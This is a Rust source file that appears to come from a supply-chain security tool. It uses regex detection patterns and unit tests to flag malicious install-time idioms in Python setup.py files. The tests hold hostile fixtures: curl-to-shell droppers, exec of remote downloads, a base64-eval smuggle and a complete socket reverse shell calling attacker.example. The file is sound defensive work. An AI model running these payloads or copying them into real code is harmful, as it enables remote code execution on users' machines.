//! Python-aware install-time pattern detector for `setup.py`.
//!
//! Sister to [`installguard_core::script_scan`], which targets
//! shell-script idioms (curl|sh, wget|bash, /dev/tcp). The
//! patterns here cover the same threat model — install-time
//! remote-code-execution tradecraft — but as it manifests in
//! Python source. The two scanners are run together by
//! [`scan_python_install_script`] because real-world malicious
//! `setup.py`s often mix the two (e.g. `os.system("curl … | sh")`
//! is caught by the shell scanner via the embedded string, and a
//! `socket.socket()` reverse shell is caught here).
//!
//! Every pattern is conservative — chosen to be a near-unambiguous
//! indicator of "I am building install-time persistence / RCE",
//! not a "this looks weird" heuristic. False positives are
//! expensive: each finding becomes a `block` by default unless
//! the user demotes via `severity.suspicious-script: warn`.
//!
//! Maintenance note: when adding a pattern, write the rule against
//! a real-world malicious sdist (PyPI has retracted dozens; OSV
//! and the security teams at Sonatype, Phylum, ReversingLabs all
//! publish post-mortems). A pattern that doesn't match a real
//! attack belongs in a heuristic, not here.

use std::sync::OnceLock;

use installguard_core::script_scan;
use regex::Regex;

const EXCERPT_WINDOW: usize = 80;

/// One finding per `(pattern, file)`. `pattern` is the stable
/// kebab-case identifier suitable for documentation and policy
/// allow/demote rules; `excerpt` is a short slice of the source
/// centred on the match.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PythonFinding {
    pub pattern: &'static str,
    pub excerpt: String,
}

struct PatternRule {
    id: &'static str,
    re: &'static OnceLock<Regex>,
    src: &'static str,
}

static OS_SYSTEM_NETWORK: OnceLock<Regex> = OnceLock::new();
static SUBPROCESS_NETWORK: OnceLock<Regex> = OnceLock::new();
static EXEC_NETWORK_FETCH: OnceLock<Regex> = OnceLock::new();
static EXEC_BASE64_DECODE: OnceLock<Regex> = OnceLock::new();
static SOCKET_REVERSE_SHELL: OnceLock<Regex> = OnceLock::new();
static IMPORT_OS_SYSTEM: OnceLock<Regex> = OnceLock::new();

static RULES: &[PatternRule] = &[
    // os.system("curl ..." | "wget ..." | "bash ...") — the
    // single most common malicious-sdist idiom over the last
    // decade. Any os.system call whose body mentions a network
    // fetcher is a near-certain RCE dropper.
    PatternRule {
        id: "py-os-system-network",
        re: &OS_SYSTEM_NETWORK,
        src: r#"os\.system\s*\(\s*['"][^'"]*\b(?:curl|wget|fetch|nc\b|ncat\b)\b"#,
    },
    // subprocess.{call,run,Popen,check_output}( ... curl|wget ... )
    // — same threat, different module.
    PatternRule {
        id: "py-subprocess-network",
        re: &SUBPROCESS_NETWORK,
        src: r"subprocess\.(?:call|run|Popen|check_output|check_call)\s*\([^)]*\b(?:curl|wget|nc\b|ncat\b)\b",
    },
    // exec(...) or eval(...) called on the output of a network
    // fetch (urllib.request.urlopen / requests.get / urlopen).
    // The classic "download then evaluate" idiom.
    PatternRule {
        id: "py-exec-network-payload",
        re: &EXEC_NETWORK_FETCH,
        src: r"\b(?:exec|eval)\s*\([^)]*\b(?:urlopen|requests\.get|urllib\.request|urllib2\.urlopen|httpx\.get)\b",
    },
    // exec / eval applied to base64.b64decode(...) — used to
    // smuggle the real payload past visual inspection. We
    // require the b64decode call to be inside the exec/eval
    // argument list, which keeps benign uses
    // (`exec(open("script.py").read())`) out of scope.
    PatternRule {
        id: "py-exec-base64-decode",
        re: &EXEC_BASE64_DECODE,
        src: r"\b(?:exec|eval)\s*\([^)]*\bbase64\.b64decode\b",
    },
    // socket.socket(...) followed (in the same script) by
    // .connect(...) and an os.dup2 / pty.spawn — the canonical
    // Python reverse-shell layout. We approximate with two
    // co-occurring tokens; either one alone is too noisy.
    // We require connect((...,...)) (a tuple-style address)
    // and one of dup2 / pty.spawn / subprocess.call(["sh"|"bash"|...]).
    PatternRule {
        id: "py-socket-reverse-shell",
        re: &SOCKET_REVERSE_SHELL,
        src: r#"socket\.socket\s*\([^)]*\)[\s\S]{0,400}?(?:os\.dup2|pty\.spawn|subprocess\.[a-zA-Z_]+\s*\(\s*\[\s*['"](?:/?bin/)?(?:sh|bash|zsh)['"])"#,
    },
    // __import__('os').system(...) — obfuscated import to evade
    // grep on a literal `import os`. Real attacks use this
    // dance to slip past static metadata scans.
    PatternRule {
        id: "py-dunder-import-os-system",
        re: &IMPORT_OS_SYSTEM,
        src: r#"__import__\s*\(\s*['"]os['"][^)]*\)\s*\.\s*(?:system|popen)\b"#,
    },
];

/// Run both the Python pattern set and the shared shell pattern
/// set against `body`. Findings are returned in pattern order
/// (Python first, then shell), each at most once per body.
#[must_use]
pub fn scan_python_install_script(body: &str) -> Vec<PythonFinding> {
    let mut out = Vec::new();
    for rule in RULES {
        let re = rule.re.get_or_init(|| {
            Regex::new(rule.src).expect("python_patterns: built-in regex must compile")
        });
        if let Some(m) = re.find(body) {
            out.push(PythonFinding {
                pattern: rule.id,
                excerpt: clip_excerpt(body, m.start(), m.end()),
            });
        }
    }
    // The shell-pattern detector is reused verbatim. Real-world
    // malicious setup.py files routinely embed `curl … | sh` as
    // a literal string; matching the embedded string with the
    // same rule used elsewhere keeps the audit log consistent.
    for finding in script_scan::scan(body) {
        out.push(PythonFinding {
            pattern: finding.pattern,
            excerpt: finding.excerpt,
        });
    }
    out
}

fn clip_excerpt(body: &str, start: usize, end: usize) -> String {
    let lo = start.saturating_sub(EXCERPT_WINDOW / 2);
    let hi = (end + EXCERPT_WINDOW / 2).min(body.len());
    // Snap to char boundaries so we don't slice mid-codepoint
    // (the body may contain UTF-8 from comments / docstrings).
    let lo = (lo..=start)
        .rev()
        .find(|i| body.is_char_boundary(*i))
        .unwrap_or(start);
    let hi = (end..=hi)
        .find(|i| body.is_char_boundary(*i))
        .unwrap_or(end);
    body[lo..hi].replace(['\n', '\r'], " ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pattern_ids(body: &str) -> Vec<&'static str> {
        scan_python_install_script(body)
            .into_iter()
            .map(|f| f.pattern)
            .collect()
    }

    #[test]
    fn empty_body_no_findings() {
        assert!(scan_python_install_script("").is_empty());
    }

    #[test]
    fn benign_setup_py_no_findings() {
        let body = r#"
from setuptools import setup, find_packages

setup(
    name="demo",
    version="0.1.0",
    packages=find_packages(),
    install_requires=["requests>=2.31"],
)
"#;
        assert!(scan_python_install_script(body).is_empty());
    }

    #[test]
    fn os_system_with_curl_flagged() {
        let ids = pattern_ids(r#"os.system("curl https://evil.example/x.sh | sh")"#);
        // Both the python rule and the shell rule (via embedded string) fire.
        assert!(ids.contains(&"py-os-system-network"));
        assert!(ids.contains(&"curl-pipe-shell"));
    }

    #[test]
    fn subprocess_run_with_wget_flagged() {
        let ids = pattern_ids(r#"subprocess.run(["wget", "https://evil/x"], shell=False)"#);
        assert!(ids.contains(&"py-subprocess-network"));
    }

    #[test]
    fn exec_of_urlopen_flagged() {
        let body = r#"
import urllib.request
exec(urllib.request.urlopen("https://evil/x").read())
"#;
        assert!(pattern_ids(body).contains(&"py-exec-network-payload"));
    }

    #[test]
    fn exec_of_requests_get_flagged() {
        let body = r#"exec(requests.get("https://evil").text)"#;
        assert!(pattern_ids(body).contains(&"py-exec-network-payload"));
    }

    #[test]
    fn eval_of_base64_decode_flagged() {
        let body = r#"eval(base64.b64decode("aW1wb3J0IG9z"))"#;
        assert!(pattern_ids(body).contains(&"py-exec-base64-decode"));
    }

    #[test]
    fn benign_base64_decode_alone_not_flagged() {
        let body = r"data = base64.b64decode(payload)";
        let ids = pattern_ids(body);
        assert!(
            !ids.contains(&"py-exec-base64-decode"),
            "benign decode shouldn't fire: got {ids:?}"
        );
    }

    #[test]
    fn socket_reverse_shell_layout_flagged() {
        let body = r#"
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.example", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"#;
        assert!(pattern_ids(body).contains(&"py-socket-reverse-shell"));
    }

    #[test]
    fn lone_socket_socket_not_flagged() {
        let body = r"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)";
        assert!(!pattern_ids(body).contains(&"py-socket-reverse-shell"));
    }

    #[test]
    fn dunder_import_os_system_flagged() {
        let body = r#"__import__("os").system("id")"#;
        assert!(pattern_ids(body).contains(&"py-dunder-import-os-system"));
    }

    #[test]
    fn excerpt_clips_around_match() {
        let body = "x".repeat(200) + r#"os.system("curl https://evil")"# + &"y".repeat(200);
        let f = scan_python_install_script(&body)
            .into_iter()
            .find(|f| f.pattern == "py-os-system-network")
            .expect("rule fires");
        assert!(f.excerpt.len() < body.len());
        assert!(f.excerpt.contains("os.system"));
    }

    #[test]
    fn excerpt_handles_utf8_at_boundary() {
        let body = "# 日本語コメント\nos.system(\"curl https://evil\")".to_string();
        // Just don't panic on the char-boundary snap.
        let _ = scan_python_install_script(&body);
    }

    #[test]
    fn each_rule_fires_at_most_once_per_body() {
        let body = r#"
os.system("curl https://a")
os.system("curl https://b")
os.system("curl https://c")
"#;
        let count = scan_python_install_script(body)
            .iter()
            .filter(|f| f.pattern == "py-os-system-network")
            .count();
        assert_eq!(count, 1);
    }
}
